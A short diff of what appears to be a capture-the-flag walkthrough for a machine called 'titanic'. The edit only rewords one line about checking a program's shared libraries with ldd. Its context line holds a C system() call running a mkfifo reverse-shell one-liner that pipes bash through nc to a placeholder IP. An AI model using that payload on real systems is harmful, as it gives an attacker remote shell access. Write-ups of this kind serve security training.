@@ -219,7 +219,7 @@ system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP> 4444 >/tmp/
 exit(0);
 }
 ```
-+ We can check the available lib:
++ We can check the shared libraries are used by the program:
 ```bash
 developer@titanic:~$ ldd /usr/sbin/apache2
 	linux-vdso.so.1 (0x00007ffcbdb5d000)
